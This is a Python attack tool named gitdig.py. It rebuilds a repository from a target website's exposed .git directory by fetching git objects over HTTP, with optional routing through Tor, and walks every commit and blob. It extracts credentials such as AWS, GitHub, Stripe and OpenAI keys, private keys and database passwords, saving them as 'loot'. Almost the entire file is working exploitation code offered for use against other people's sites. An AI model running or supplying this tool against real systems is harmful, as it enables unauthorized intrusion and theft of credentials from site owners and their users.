#!/usr/bin/env python3
"""
gitdig.py — .git exposure exploitation without external dependencies.

Reconstructs a repository from an exposed .git directory by fetching objects
directly over HTTP, then walks EVERY commit/blob/tree for secrets.

Why not just git-dumper: it needs dulwich and gives up silently on odd servers.
This reads objects itself, so it works when index/pack fetch is blocked and falls
back to per-object retrieval (HEAD refs + loose objects).

Secrets are written to ~/loot/secrets (600) and never printed.

usage:
  python3 gitdig.py https://target.com
  python3 gitdig.py https://target.com --out ~/loot/raw/target_git
"""
from __future__ import annotations

import argparse
import os
import re
import shutil
import subprocess
import sys
import zlib

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.webutil import (Client, fp, jsonout, norm_url, redact, save_secret,  # noqa: E402
                         table)

SECRET_RES = [
    ("private_key", r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]{20,4000}?-----END [A-Z ]*PRIVATE KEY-----"),
    ("aws_ak", r"\bAKIA[0-9A-Z]{16}\b"),
    ("huawei_ak", r"\bLTAI[A-Za-z0-9]{12,}\b"),
    ("github_pat", r"\bgh[pousr]_[A-Za-z0-9]{20,}\b"),
    ("slack", r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b"),
    ("stripe", r"\bsk_live_[A-Za-z0-9]{10,}\b"),
    ("google_api", r"\bAIza[0-9A-Za-z_\-]{35}\b"),
    ("jwt", r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b"),
    ("hex64", r"\b(?:0x)?[a-fA-F0-9]{64}\b"),
    ("db_pass", r"(?i)(?:DB_PASSWORD|DATABASE_URL|MYSQL_PWD|POSTGRES_PASSWORD)\s*[=:]\s*\S+"),
    ("app_key", r"(?i)APP_KEY\s*=\s*base64:[A-Za-z0-9+/=]+"),
    ("sendgrid", r"\bSG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{16,}\b"),
    ("openai", r"\bsk-[A-Za-z0-9]{32,}\b"),
    ("telegram", r"\b\d{8,10}:AA[A-Za-z0-9_\-]{30,}\b"),
]

INTERESTING_PATHS = re.compile(
    r"\.(env|envrc|ini|cfg|conf|config|yml|yaml|json|properties|toml|xml|pem|key|p12|pfx|php|py|js|ts|rb|go|java|sh|sql|bak|old|txt|md)$",
    re.I)


def fetch(client: Client, base: str, rel: str, binary=False):
    """Fetch a file inside .git. binary=True returns a LATIN-1 string so that
    zlib payloads survive the Resp decode (re-encoding with latin-1 is lossless,
    utf-8 is not)."""
    r = client.get(f"{base}/.git/{rel.lstrip('/')}")
    if not r.ok or r.status >= 400:
        return None
    if binary:
        return r.raw_bytes.decode("latin-1")
    return r.body


def parse_loose(obj):
    """Decompress a loose git object -> (type, content). Accepts bytes or latin-1 str."""
    if isinstance(obj, str):
        obj = obj.encode("latin-1")
    try:
        raw = zlib.decompress(obj)
    except Exception:
        return None, None
    head, _, body = raw.partition(b"\x00")
    try:
        typ = head.split(b" ")[0].decode()
    except Exception:
        return None, None
    return typ, body


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--out", default=None)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--tor", action="store_true")
    ap.add_argument("--json", default=None)
    ap.add_argument("--max-objects", type=int, default=4000)
    ap.add_argument("--timeout", type=int, default=15)
    a = ap.parse_args()

    base = norm_url(a.target)
    client = Client(timeout=a.timeout, proxy=a.proxy or ("socks5h://127.0.0.1:9050" if a.tor else None))
    outdir = os.path.expanduser(a.out or f"~/loot/raw/{re.sub(r'[^a-z0-9.]', '_', base)}_git")
    os.makedirs(outdir, exist_ok=True)

    head = fetch(client, base, "HEAD")
    cfg = fetch(client, base, "config")
    result = {"target": base, "git_dir": outdir, "exposed": bool(head or cfg),
              "head": redact((head or "")[:120]), "remote": None,
              "objects": 0, "commits": 0, "blobs_scanned": 0, "secrets": [],
              "interesting_files": [], "method": []}

    if not result["exposed"]:
        result["error"] = ".git not exposed (HEAD and config both unreadable)"
        print(jsonout(result))
        return 0

    if head:
        with open(os.path.join(outdir, "HEAD"), "w") as f:
            f.write(head)
    if cfg:
        with open(os.path.join(outdir, "config"), "w") as f:
            f.write(cfg)
        m = re.search(r'url\s*=\s*(\S+)', cfg or "")
        if m:
            result["remote"] = m.group(1)

    # --- attempt 1: real git client on a rebuilt dir (handles packs) --------
    shutil.rmtree(outdir, ignore_errors=True)
    os.makedirs(outdir)
    ok_clone = False
    gd = os.path.expanduser("~/.local/bin/git-dumper")
    if os.path.exists(gd):
        try:
            p = subprocess.run([sys.executable, gd, f"{base}/.git", outdir],
                               capture_output=True, text=True, timeout=400)
            ok_clone = p.returncode == 0 and os.path.isdir(os.path.join(outdir, ".git"))
            if ok_clone:
                result["method"].append("git-dumper")
        except Exception:
            pass

    # --- attempt 2: manual loose-object walk (works when dumper fails) -------
    if not ok_clone:
        result["method"].append("manual-loose-objects")
        gd = os.path.join(outdir, ".git")
        for d in ("objects", "refs/heads", "refs/tags", "logs"):
            os.makedirs(os.path.join(gd, d), exist_ok=True)
        if head:
            open(os.path.join(gd, "HEAD"), "w").write(head)
        refs = []
        for line in (head or "").splitlines():
            m = re.match(r"ref:\s*(\S+)", line.strip())
            if m:
                refs.append(m.group(1))
        if not refs:
            refs = ["refs/heads/main", "refs/heads/master", "refs/heads/develop"]
        heads = []
        for ref in refs:
            body = fetch(client, base, ref)
            if body:
                sha = body.strip().split()[0]
                heads.append(sha)
                path = os.path.join(gd, ref)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                open(path, "w").write(body)
        packed = fetch(client, base, "packed-refs")
        if packed:
            open(os.path.join(gd, "packed-refs"), "w").write(packed)
            for line in packed.splitlines():
                if re.match(r"^[0-9a-f]{40}\s", line):
                    heads.append(line.split()[0])

        # walk commit -> tree -> blobs
        seen, queue = set(), list(heads)
        blobs = []
        while queue and len(seen) < a.max_objects:
            sha = queue.pop(0)
            if sha in seen or not re.match(r"^[0-9a-f]{40}$", sha):
                continue
            seen.add(sha)
            raw = fetch(client, base, f"objects/{sha[:2]}/{sha[2:]}", binary=True)
            if raw is None:
                continue
            typ, body = parse_loose(raw)
            if typ is None:
                continue
            store = os.path.join(gd, "objects", sha[:2])
            os.makedirs(store, exist_ok=True)
            open(os.path.join(store, sha[2:]), "wb").write(
                raw.encode("latin-1") if isinstance(raw, str) else raw)
            if typ == "commit":
                result["commits"] += 1
                for line in body.split(b"\n"):
                    if line.startswith(b"tree ") or line.startswith(b"parent "):
                        queue.append(line.split()[1].decode())
            elif typ == "tree":
                i = 0
                while i < len(body):
                    sp = body.find(b" ", i)
                    nul = body.find(b"\x00", sp)
                    if sp < 0 or nul < 0:
                        break
                    mode = body[i:sp]
                    name = body[sp + 1:nul]
                    sha20 = body[nul + 1:nul + 21]
                    i = nul + 21
                    if len(sha20) == 20:
                        csha = sha20.hex()
                        if mode.startswith(b"4") or mode.startswith(b"10"):
                            queue.append(csha)
                        else:
                            blobs.append((name.decode("utf8", "ignore"), csha))
            elif typ == "blob":
                blobs.append(("", sha))
            result["objects"] += 1

        for name, bsha in blobs[:a.max_objects]:
            raw = fetch(client, base, f"objects/{bsha[:2]}/{bsha[2:]}", binary=True)
            if not raw:
                continue
            typ, body = parse_loose(raw)
            if typ != "blob":
                continue
            result["blobs_scanned"] += 1
            text = body.decode("utf-8", "ignore")
            for sname, pat in SECRET_RES:
                for m in re.finditer(pat, text):
                    val = m.group(0)
                    if "EXAMPLE" in val:
                        continue
                    f = f"{re.sub(r'[^a-z0-9.]', '_', base)}_git_{sname}_{fp(val)}.txt"
                    path = save_secret(f, val)
                    result["secrets"].append({"type": sname, "file": name or f"blob:{bsha[:8]}",
                                              "fingerprint": fp(val),
                                              "stored_at": path.replace(os.path.expanduser("~"), "~"),
                                              "status": "SUSPECT"})
                    break
            if name and INTERESTING_PATHS.search(name):
                result["interesting_files"].append({"file": name, "size": len(text),
                                                    "sha": bsha[:8]})

    else:
        # git-dumper succeeded: use git to hunt history
        g = os.path.join(outdir, ".git")
        for d in ("objects", "refs/heads", "logs"):
            pass
        try:
            revs = subprocess.run(["git", "-C", outdir, "rev-list", "--all"],
                                  capture_output=True, text=True, timeout=120).stdout.split()
            result["commits"] = len(revs)
            result["objects"] = len(revs)
            files = subprocess.run(["git", "-C", outdir, "ls-tree", "-r", "--name-only", "HEAD"],
                                   capture_output=True, text=True, timeout=60).stdout.splitlines()
            result["blobs_scanned"] = len(files)
            grep = subprocess.run(
                ["git", "-C", outdir, "grep", "-I", "-n", "-E", "-h",
                 r"PRIVATE KEY|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk_live_|LTAI|AIza|DB_PASSWORD|APP_KEY"],
                 capture_output=True, text=True, timeout=180).stdout
            for line in grep.splitlines()[:80]:
                for sname, pat in SECRET_RES:
                    if re.search(pat, line):
                        m = re.search(pat, line)
                        val = m.group(0)
                        if "EXAMPLE" in val:
                            continue
                        f = f"{re.sub(r'[^a-z0-9.]', '_', base)}_git_{sname}_{fp(val)}.txt"
                        path = save_secret(f, val)
                        result["secrets"].append({"type": sname, "file": redact(line[:80]),
                                                  "fingerprint": fp(val),
                                                  "stored_at": path.replace(os.path.expanduser("~"), "~"),
                                                  "status": "SUSPECT"})
                        break
            result["interesting_files"] = [{"file": x} for x in files if INTERESTING_PATHS.search(x)][:40]
        except Exception as e:  # noqa: BLE001
            result["error"] = f"git CLI post-processing: {e}"

    result["summary"] = {"commits": result["commits"], "blobs": result["blobs_scanned"],
                         "secrets": len(result["secrets"]),
                         "interesting_files": len(result["interesting_files"])}
    print(table([[s["type"], s["file"], s["fingerprint"], s["stored_at"]]
                 for s in result["secrets"]], ["TYPE", "FILE", "FP", "STORED"]), file=sys.stderr)
    out = jsonout(result)
    print(out)
    if a.json:
        open(a.json, "w").write(out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
